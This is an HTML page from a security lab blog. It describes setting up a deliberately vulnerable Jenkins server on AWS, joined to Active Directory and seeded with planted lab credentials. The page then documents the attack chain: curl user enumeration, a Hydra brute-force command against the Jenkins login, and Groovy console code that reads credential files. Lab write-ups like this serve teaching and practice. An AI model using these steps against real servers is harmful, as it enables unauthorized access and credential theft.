@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>AWS Jenkins Setup | Hybrid AD Lab | 0x1Ak4sh</title>
+    <meta name="description" content="EC2 instance, domain join, Jenkins with planted credentials, anonymous user enumeration, brute force to Domain Admin — full attack chain documented.">
+    <meta name="robots" content="noindex,follow">
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/8d67cb621b.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="/css/article.css?v=1.5">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css">
+</head>
+
+<body class="article-page">
+    <div class="reading-progress"></div>
+    <div id="canvas_snake" class="canvas canvas-snake" data-colorone="#0b1115" data-colortwo="#a4ff91"
+        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.3;"></div>
+
+    <nav class="article-nav">
+        <div class="nav-left">
+            <a href="/projects/hybrid-ad-lab/" class="nav-back">
+                <i class="fas fa-arrow-left"></i><span>Back to Lab Overview</span>
+            </a>
+            <a href="/" class="nav-logo">0x1Ak4sh</a>
+        </div>
+        <div class="nav-right">
+            <button class="nav-share-btn" onclick="document.querySelector('.share-section').scrollIntoView({behavior:'smooth'})" title="Share">
+                <i class="fas fa-share-alt"></i>
+            </button>
+        </div>
+    </nav>
+
+    <section class="article-hero">
+        <div class="hero-content">
+            <div class="hero-badges">
+                <span class="badge badge-category"><i class="fab fa-aws"></i> AWS EC2</span>
+            </div>
+            <h1 class="hero-title">AWS Jenkins Setup</h1>
+            <p style="color: rgba(255,255,255,0.7); font-size: 1.05rem; margin: 0.5rem 0 1rem; max-width: 650px;">
+                EC2 Ubuntu instance domain-joined to Active Directory, running Jenkins with deliberate misconfigurations. Anonymous user enumeration, brute-force login, Groovy console credential extraction, and a full attack chain to Domain Admin.
+            </p>
+            <div class="hero-tags">
+                <a href="#" class="hero-tag">#aws-ec2</a>
+                <a href="#" class="hero-tag">#jenkins</a>
+                <a href="#" class="hero-tag">#credential-exposure</a>
+                <a href="#" class="hero-tag">#attack-chain</a>
+            </div>
+        </div>
+    </section>
+
+    <main class="article-layout" style="position:relative;z-index:1;">
+        <aside class="toc-sidebar">
+            <div class="toc-title">Contents</div>
+            <ul class="toc-list">
+                <li><a href="#ec2">Launch EC2 Instance</a></li>
+                <li><a href="#security-group">Security Group Rules</a></li>
+                <li><a href="#wireguard">WireGuard Setup</a></li>
+                <li><a href="#domain-join">Domain Join</a></li>
+                <li><a href="#jenkins-install">Install Jenkins</a></li>
+                <li><a href="#key-error">Key Expired Fix</a></li>
+                <li><a href="#jenkins-setup">Initial Setup</a></li>
+                <li><a href="#vuln-config">Planted Vulnerabilities</a></li>
+                <li><a href="#attack-chain">Attack Chain</a></li>
+            </ul>
+        </aside>
+
+        <article class="article-content">
+
+            <figure class="intro-image">
+                <img src="/projects/hybrid-ad-lab/img/AWSJenkinsSetup.png" alt="AWS Jenkins server setup for external entry point">
+                <figcaption>Deploying the external entry point on AWS EC2 with Jenkins</figcaption>
+            </figure>
+
+            <div class="tech-stack">
+                <div class="tech-item"><i class="fab fa-aws"></i> AWS EC2 c7i-flex.large</div>
+                <div class="tech-item"><i class="fab fa-linux"></i> Ubuntu 24.04 LTS</div>
+                <div class="tech-item"><i class="fas fa-infinity"></i> Jenkins LTS</div>
+                <div class="tech-item"><i class="fab fa-java"></i> OpenJDK 17</div>
+                <div class="tech-item"><i class="fas fa-network-wired"></i> WireGuard VPN</div>
+                <div class="tech-item"><i class="fab fa-python"></i> Python 3.12</div>
+                <div class="tech-item"><i class="fas fa-key"></i> Groovy Console</div>
+                <div class="tech-item"><i class="fas fa-shield-alt"></i> Hydra / Nmap</div>
+            </div>
+
+            <h2 id="ec2">Step 1 — Launch EC2 Instance</h2>
+            <p>Logged into the AWS Console, went to EC2 → Launch Instance. The machine is named <code>WATCHTOWER</code>. Selected Ubuntu as the OS and <code>c7i-flex.large</code> as the instance type — 2 vCPU, 4 GB RAM, enough for Jenkins.</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517033750.png" alt="AWS EC2 launch instance page showing Ubuntu selected as the OS and AMI">
+                <figcaption>Ubuntu selected as the OS for WATCHTOWER</figcaption>
+            </figure>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517033810.png" alt="AWS EC2 instance type selection showing c7i-flex.large with 2 vCPU and 4 GB RAM">
+                <figcaption>Instance type: c7i-flex.large — 2 vCPU, 4 GB RAM</figcaption>
+            </figure>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517033946.png" alt="AWS EC2 launch summary showing Ubuntu OS, c7i-flex.large type, and 8 GB storage">
+                <figcaption>Launch summary — OS, type, and storage confirmed before launching</figcaption>
+            </figure>
+
+            <h2 id="security-group">Step 2 — Security Group Rules</h2>
+            <p>Initially set the security group to allow SSH, HTTP, and HTTPS. After launch, added WireGuard (UDP 51820) and Jenkins (TCP 8080).</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517034002.png" alt="AWS security group inbound rules showing SSH port 22, HTTP 80, and HTTPS 443 initially configured">
+                <figcaption>Initial security group — SSH, HTTP, HTTPS</figcaption>
+            </figure>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517034127.png" alt="AWS EC2 dashboard showing the WATCHTOWER instance in initializing state after launch">
+                <figcaption>Instance initializing — named it Shield in AWS console (Marvel theme)</figcaption>
+            </figure>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517035623.png" alt="AWS EC2 instance security tab showing ports 22, 80, and 443 open in the initial security group">
+                <figcaption>Security tab showing the initial inbound rules</figcaption>
+            </figure>
+
+            <p>Updated security group to add WireGuard and Jenkins:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517035836.png" alt="AWS security group inbound rules updated to include UDP 51820 for WireGuard and TCP 8080 for Jenkins">
+                <figcaption>Final security group — added UDP 51820 (WireGuard) and TCP 8080 (Jenkins)</figcaption>
+            </figure>
+
+            <table>
+                <thead><tr><th>Protocol</th><th>Port</th><th>Source</th><th>Purpose</th></tr></thead>
+                <tbody>
+                    <tr><td>TCP</td><td>22</td><td>Your IP</td><td>SSH admin access</td></tr>
+                    <tr><td>TCP</td><td>8080</td><td>0.0.0.0/0</td><td>Jenkins web UI (public — intentional)</td></tr>
+                    <tr><td>UDP</td><td>51820</td><td>0.0.0.0/0</td><td>WireGuard</td></tr>
+                </tbody>
+            </table>
+
+            <div class="prompt-box prompt-info">
+                <div class="prompt-title"><i class="fas fa-info-circle"></i> Port 8080 public — intentional</div>
+                <p>Jenkins is exposed publicly on port 8080 by design. This is the entry point for the attack chain. In a real environment this would be a serious misconfiguration. Here it is deliberate.</p>
+            </div>
+
+            <h2 id="wireguard">Step 3 — WireGuard on the EC2 Machine</h2>
+            <p>SSH'd into the instance and installed WireGuard. The process is the same as the Oracle Linux machine.</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">sudo apt update && sudo apt install -y wireguard
+
+# Generate key pair
+wg genkey | sudo tee /etc/wireguard/private.key | wg pubkey | sudo tee /etc/wireguard/public.key
+sudo chmod 600 /etc/wireguard/private.key
+
+# Copy the public key — add this on DC01 as a new peer
+cat /etc/wireguard/public.key</code></pre>
+            </div>
+
+            <p>Create the WireGuard config. This machine gets IP <code>10.10.0.5</code>:</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash — /etc/wireguard/wg0.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">sudo tee /etc/wireguard/wg0.conf << 'EOF'
+[Interface]
+PrivateKey = CONTENTS_OF_private.key
+Address = 10.10.0.5/24
+ListenPort = 51820
+
+[Peer]
+PublicKey = &lt;DC01-PUBLIC-KEY&gt;
+AllowedIPs = 10.10.0.0/24
+Endpoint = &lt;DC01-VULTR-PUBLIC-IP&gt;:51820
+PersistentKeepalive = 25
+EOF
+
+sudo systemctl enable wg-quick@wg0 && sudo systemctl start wg-quick@wg0
+ping -c 3 10.10.0.1</code></pre>
+            </div>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517041301.png" alt="Ping from WATCHTOWER to DC01 at 10.10.0.1 showing successful replies through WireGuard tunnel">
+                <figcaption>Ping to DC01 working — WireGuard tunnel is up from the AWS machine</figcaption>
+            </figure>
+
+            <h2 id="domain-join">Step 4 — Set DNS and Join the Domain</h2>
+            <p>The machine uses systemd-resolved for DNS. Created a netplan override to point DNS at DC01 through the WireGuard IP:</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash — DNS config via netplan</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">cat << 'EOF' | sudo tee /etc/netplan/99-custom-dns.yaml
+network:
+  version: 2
+  ethernets:
+    enp39s0:
+      nameservers:
+        addresses: [10.10.0.1, 8.8.8.8]
+        search: [hq.apex-corp.xyz]
+      dhcp4-overrides:
+        use-dns: false
+        use-domains: false
+EOF
+
+sudo chmod 600 /etc/netplan/99-custom-dns.yaml
+sudo netplan try</code></pre>
+            </div>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517041455.png" alt="netplan config file showing the existing 50-cloud-init.yaml and DNS override file on the WATCHTOWER machine">
+                <figcaption>Netplan config showing the existing cloud-init config and our DNS override</figcaption>
+            </figure>
+
+            <p>Installed the domain join packages:</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">sudo apt install -y realmd sssd sssd-tools adcli krb5-user samba-common-bin</code></pre>
+            </div>
+
+            <p>During <code>krb5-user</code> install, the installer asks for the Kerberos realm. Entered <code>HQ.APEX-CORP.XYZ</code> in uppercase:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517041441.png" alt="Kerberos configuration dialog asking for the default Kerberos realm with HQ.APEX-CORP.XYZ entered">
+                <figcaption>Kerberos realm — must be uppercase: HQ.APEX-CORP.XYZ</figcaption>
+            </figure>
+
+            <p>Same rdns fix as the Oracle machine — add <code>rdns = false</code> to <code>/etc/krb5.conf</code>, then join:</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash"># Fix reverse DNS validation in Kerberos
+sudo sed -i '/\[libdefaults\]/a\    rdns = false' /etc/krb5.conf
+
+# Discover and join the domain
+realm discover hq.apex-corp.xyz
+sudo realm join hq.apex-corp.xyz -U t.stark --verbose</code></pre>
+            </div>
+
+            <p>After joining, verified DNS resolution and SMB access:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517062027.png" alt="realm join output on WATCHTOWER showing Successfully enrolled machine in realm hq.apex-corp.xyz">
+                <figcaption>Domain join succeeded — WATCHTOWER is now in hq.apex-corp.xyz</figcaption>
+            </figure>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517065130.png" alt="smbclient connected to STARK-TOWER from WATCHTOWER showing available shares listed">
+                <figcaption>SMB access working from WATCHTOWER to DC01 — cross-cloud access confirmed</figcaption>
+            </figure>
+
+            <h2 id="jenkins-install">Step 5 — Install Jenkins</h2>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">sudo apt install -y default-jdk
+
+# Add the Jenkins repository (2026 key — see note below if you get key errors)
+curl -fsSL https://pkg.jenkins.io/debian-stable/jenkins.io-2026.key | sudo tee /usr/share/keyrings/jenkins-keyring.asc > /dev/null
+echo "deb [signed-by=/usr/share/keyrings/jenkins-keyring.asc] https://pkg.jenkins.io/debian-stable binary/" | sudo tee /etc/apt/sources.list.d/jenkins.list
+
+sudo apt update
+sudo apt install -y jenkins
+
+# Start and enable
+sudo systemctl enable jenkins && sudo systemctl start jenkins
+
+# Get initial admin password
+sudo cat /var/lib/jenkins/secrets/initialAdminPassword</code></pre>
+            </div>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517070330.png" alt="systemctl status jenkins showing active running and Jenkins service started successfully">
+                <figcaption>Jenkins service is active and running</figcaption>
+            </figure>
+
+            <h2 id="key-error">Note — Jenkins Repository Key URL</h2>
+            <p>If the <code>apt install</code> fails with a GPG key error on <code>pkg.jenkins.io</code>, the key URL in the curl command is wrong. Jenkins provides separate key files — <code>jenkins.io.key</code> and <code>jenkins.io-2026.key</code> both exist, but only the one matching your apt source works. The command below uses the correct one.</p>
+
+            <div class="prompt-box prompt-warning">
+                <div class="prompt-title"><i class="fas fa-exclamation-triangle"></i> Wrong key URL</div>
+                <p><code>curl -fsSL https://pkg.jenkins.io/debian-stable/jenkins.io.key</code> — this key may not match the repository definition and apt will reject it with a GPG error.</p>
+            </div>
+
+            <h2 id="jenkins-setup">Step 6 — Initial Jenkins Setup in Browser</h2>
+            <p>Opened a browser and went to <code>http://&lt;AWS-PUBLIC-IP&gt;:8080</code>. The unlock screen appeared asking for the initial admin password:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517071012.png" alt="Jenkins Unlock Jenkins page asking for the initial administrator password from the server path">
+                <figcaption>Jenkins unlock screen — paste the initial admin password from the terminal</figcaption>
+            </figure>
+
+            <p>Pasted the password from the terminal. Jenkins then loaded the Getting Started screen and installed suggested plugins:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517071136.png" alt="Jenkins Getting Started screen showing plugin installation in progress with a list of plugins being installed">
+                <figcaption>Jenkins installing suggested plugins after first login</figcaption>
+            </figure>
+
+            <p>On the Create First Admin User screen, used a real AD account as the Jenkins admin — this is the misconfiguration:</p>
+            <ul>
+                <li><strong>Username:</strong> <code>b.allen</code> (Barry Allen — exists in AD)</li>
+                <li><strong>Password:</strong> <code>Flash4Ever!</code></li>
+                <li><strong>Email:</strong> <code>b.allen@hq.apex-corp.xyz</code></li>
+            </ul>
+
+            <h2 id="vuln-config">Step 7 — Planted Vulnerabilities</h2>
+            <p>Four types of credential exposure were configured after setup to create a realistic attack surface.</p>
+
+            <h3>1. Anonymous Read Access — People API</h3>
+            <p>In Manage Jenkins → Security → Authorization: set to "Logged-in users can do anything" and checked "Allow anonymous read access". This exposes the <code>/people/api/json</code> endpoint without any authentication — anyone can enumerate usernames without logging in.</p>
+
+            <h3>2. Jenkins Credential Manager</h3>
+            <p>Under Manage Jenkins → Credentials → Global credentials, added four stored credentials pointing at real AD service accounts:</p>
+            <table>
+                <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>What it is</th></tr></thead>
+                <tbody>
+                    <tr><td><code>svc-jarvis-ad</code></td><td>svc_jarvis</td><td>J@rv1s2025!</td><td>AD web service account</td></tr>
+                    <tr><td><code>svc-friday-linux</code></td><td>svc_friday</td><td>Fr1d@yAI2025</td><td>Linux Nginx service account</td></tr>
+                    <tr><td><code>mssql-sa</code></td><td>sa</td><td>SQLAdmin2025!</td><td>MSSQL SA account</td></tr>
+                    <tr><td><code>postgres-app</code></td><td>appuser</td><td>weak_db_pass123</td><td>PostgreSQL app DB</td></tr>
+                </tbody>
+            </table>
+
+            <h3>3. Hardcoded Credentials in Workspace Files</h3>
+            <p>Planted a deploy script and an .env file with credentials hardcoded in plaintext:</p>
+
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Bash — plant the files</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">sudo mkdir -p /var/lib/jenkins/workspace/apex-deploy
+sudo tee /var/lib/jenkins/workspace/apex-deploy/deploy.sh << 'EOF'
+#!/bin/bash
+# Apex Corp Deployment Script v2.1
+AD_USER="svc_jarvis"
+AD_PASS="J@rv1s2025!"
+DB_HOST="10.10.0.3"
+DB_USER="appuser"
+DB_PASS="weak_db_pass123"
+MSSQL_HOST="10.10.0.2"
+MSSQL_USER="sa"
+MSSQL_PASS="SQLAdmin2025!"
+echo "[*] Connecting to AD as $AD_USER..."
+EOF
+
+sudo mkdir -p /var/lib/jenkins/workspace/apex-app
+sudo tee /var/lib/jenkins/workspace/apex-app/.env << 'EOF'
+DB_CONNECTION=postgresql://appuser:weak_db_pass123@10.10.0.3:5432/helpdeskdb
+AD_SERVICE_ACCOUNT=svc_friday
+AD_SERVICE_PASSWORD=Fr1d@yAI2025
+MSSQL_SA_PASSWORD=SQLAdmin2025!
+EOF</code></pre>
+            </div>
+
+            <h3>4. Groovy Script Console Reads Sensitive Files</h3>
+            <p>This is how an attacker reads those files after getting Jenkins access. The console output shows the file contents including all credentials:</p>
+
+            <figure class="article-img">
+                <img src="/projects/hybrid-ad-lab/img/Pasted image 20260517071729.png" alt="Jenkins Groovy Script Console showing a script reading the .env file and the output displaying plaintext credentials including DB_CONNECTION string and passwords">
+                <figcaption>Groovy console reading the planted .env file — credentials exposed in plaintext</figcaption>
+            </figure>
+
+            <h2 id="attack-chain">The Attack Chain</h2>
+            <p>This is the full path from the public internet to Domain Admin using only WATCHTOWER as the entry point:</p>
+
+            <div class="mermaid-container">
+                <div class="mermaid">
+graph TD
+    A["🌐 Step 1: Enumerate Users<br/>No login needed<br/>curl http://IP:8080/people/api/json"] --> B["👤 Step 2: b.allen discovered"]
+    B --> C["🔑 Step 3: Brute-force<br/>Hydra + rockyou.txt<br/>b.allen / Flash4Ever!"]
+    C --> D["💻 Step 4: Groovy Console<br/>Manage Jenkins → Script Console"]
+    D --> E["📄 Step 5: Read creds<br/>deploy.sh + .env files<br/>svc_jarvis / J@rv1s2025!"]
+    E --> F["🎫 Step 6: AD Auth<br/>svc_jarvis has SPN<br/>Kerberoastable OR use plaintext creds"]
+    F --> G["🏰 Step 7: Domain Admin<br/>svc_alfred has GenericAll<br/>on Domain Admins group"]
+
+    style A fill:#2a1a1a,stroke:#ff6b6b,color:#fff
+    style G fill:#3a1a1a,stroke:#ff4444,color:#fff
+                </div>
+            </div>
+
+            <h3>Step A — User Enumeration (No Auth Required)</h3>
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Bash</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> curl -s http://&lt;AWS-IP&gt;:8080/people/api/json?depth=1 | python3 -m json.tool</code>
+                </div>
+                <div class="cmd-output">
+                    <button class="cmd-output-toggle"><i class="fas fa-chevron-right"></i> Show Output</button>
+                    <div class="cmd-output-content">
+                        <code>{
+  "users": [
+    {
+      "user": {
+        "fullName": "Barry Allen",
+        "id": "b.allen"
+      }
+    }
+  ]
+}</code>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Step B — Brute Force the Username</h3>
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Bash — Hydra</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> hydra -l b.allen -P /usr/share/wordlists/rockyou.txt \
+  &lt;AWS-IP&gt; \
+  http-form-post \
+  "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign+in:Invalid username or password" \
+  -V -t 10</code>
+                </div>
+            </div>
+
+            <h3>Step C — Read Files via Groovy Script Console</h3>
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-lang">Groovy — Jenkins Script Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <pre><code class="language-bash">// Read the deploy script — contains AD and DB credentials
+println new File('/var/lib/jenkins/workspace/apex-deploy/deploy.sh').text
+
+// Read the .env file — contains service account passwords
+println new File('/var/lib/jenkins/workspace/apex-app/.env').text</code></pre>
+            </div>
+
+            <div class="terminal-demo">
+                <div class="terminal-header">
+                    <span class="terminal-dot red"></span>
+                    <span class="terminal-dot yellow"></span>
+                    <span class="terminal-dot green"></span>
+                    <span class="terminal-title">Attack chain result</span>
+                </div>
+                <div class="terminal-body">
+                    <div><span class="t-prompt">$</span> <span class="t-command">curl -s http://&lt;AWS-IP&gt;:8080/people/api/json | grep "\"id\""</span></div>
+                    <div><span class="t-output">        "id" : "b.allen"</span></div>
+                    <div><span class="t-success">[+] Username found: b.allen</span></div>
+                    <div> </div>
+                    <div><span class="t-prompt">$</span> <span class="t-command">hydra -l b.allen -P rockyou.txt ... (cracking...)</span></div>
+                    <div><span class="t-success">[+] b.allen / Flash4Ever! — Jenkins login cracked</span></div>
+                    <div> </div>
+                    <div><span class="t-comment"># In Groovy console after login:</span></div>
+                    <div><span class="t-output">=== svc-jarvis-ad ===<br/>Username: svc_jarvis<br/>Password: J@rv1s2025!<br/><br/>AD_USER="svc_jarvis"<br/>AD_PASS="J@rv1s2025!"<br/>MSSQL_SA_PASSWORD=SQLAdmin2025!</span></div>
+                    <div><span class="t-success">[+] Credentials extracted. svc_jarvis is Kerberoastable → path to Domain Admin</span></div>
+                </div>
+            </div>
+
+            <nav class="article-nav-bottom">
+                <a href="/projects/hybrid-ad-lab/oracle-deployment/" class="nav-item prev">
+                    <span class="nav-label"><i class="fas fa-arrow-left"></i> Previous</span>
+                    <span class="nav-title">Oracle Cloud Deployment</span>
+                </a>
+                <a href="/projects/hybrid-ad-lab/azure-entra/" class="nav-item next">
+                    <span class="nav-label">Next <i class="fas fa-arrow-right"></i></span>
+                    <span class="nav-title">Azure Entra ID Sync</span>
+                </a>
+            </nav>
+
+
+
+            <div class="share-section">
+                <h4>Share this page</h4>
+                <div class="share-buttons">
+                    <button class="share-btn" data-action="twitter"><i class="fab fa-x-twitter"></i> Twitter</button>
+                    <button class="share-btn" data-action="linkedin"><i class="fab fa-linkedin"></i> LinkedIn</button>
+                    <button class="share-btn" data-action="copy"><i class="fas fa-link"></i> Copy Link</button>
+                </div>
+            </div>
+
+        </article>
+    </main>
+
+    <footer class="article-footer" style="position:relative;z-index:1;">
+        <p>&copy; 2025 <a href="/">0x1Ak4sh</a> - All rights reserved.</p>
+    </footer>
+    <button class="back-to-top" title="Back to top"><i class="fas fa-arrow-up"></i></button>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <script src="/js/snake.js"></script>
+    <script src="/js/article.js?v=1.5"></script>
+</body>
+
+</html>
